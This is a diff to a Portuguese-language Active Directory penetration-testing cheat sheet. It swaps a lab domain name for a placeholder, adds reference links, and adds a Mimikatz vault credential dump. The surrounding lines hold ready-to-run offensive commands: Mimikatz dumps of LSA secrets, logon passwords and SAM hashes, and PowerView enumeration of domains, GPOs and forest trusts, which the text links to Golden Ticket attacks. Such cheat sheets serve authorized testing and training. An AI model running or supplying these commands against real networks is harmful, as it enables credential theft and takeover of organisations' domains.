@@ -293,7 +293,7 @@ foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "
 ```powershell
 foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}
 ```
-funcorp
+
 ### Download de Arquivos
 
 Escolha um e seja feliz!
@@ -399,7 +399,7 @@ Get-NetOU | select name
 
 ```powershell
 (Get-NetOU StudentMachines).gplink
-Get-NetGPO -ADSpath 'LDAP://cn={B822494A-DD6A-4E96-A2BB-944E397208A1},cn=policies,cn=system,DC=us,DC=funcorp,DC=local'
+Get-NetGPO -ADSpath 'LDAP://cn={B822494A-DD6A-4E96-A2BB-944E397208A1},cn=policies,cn=system,DC=us,DC=DOMINIO,DC=local'
 ```
 
 #### Trusts
@@ -410,7 +410,7 @@ Isso é muito utilizado para Golden Ticket Across Forests!
 Get-NetForestDomain -Verbose
 Get-NetDomainTrust
 Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
-Get-NetForestDomain -Forest funcorp.local -Verbose | Get-NetDomainTrust
+Get-NetForestDomain -Forest DOMINIO.local -Verbose | Get-NetDomainTrust
 Get-NetForest
 ```
 
@@ -537,7 +537,6 @@ Essa parte é importante, mimikatz é uma das melhores ferramentas para explora�
 
 ```powershell
 # Pegar hash de usuários
-
 ./mimikatz.exe lsadump::lsa /patch
 
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"' 
@@ -545,6 +544,9 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" "exit"' 
 
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" "lsadump::sam" "exit"'
+
+# Dentro do Vault
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patch"'
 ```
 
 ### Ataques
@@ -781,11 +783,24 @@ Mais informações de como esse ataque funciona você encontra no meu blog [Silv
 
 ## Referencias
 
-Bloodhound
+**Bloodhound**
 
 https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/
 
-PowerUpSQL
+**PowerUpSQL**
 
 https://blog.netspi.com/powerupsql-powershell-toolkit-attacking-sql-server/
+
+https://blog.netspi.com/how-to-hack-database-links-in-sql-server/
+
+**Mimikatz**
+
+https://danieldonda.com/2018/11/14/lsass-dump-pass-the-hash-e-pass-the-ticket/
+
+https://attack.stealthbits.com/pass-the-hash-attack-explained
+
+**Exploração SQL**
+
+https://medium.com/@D00MFist/powerupsql-cheat-sheet-sql-server-queries-40e1c418edc3
+
 
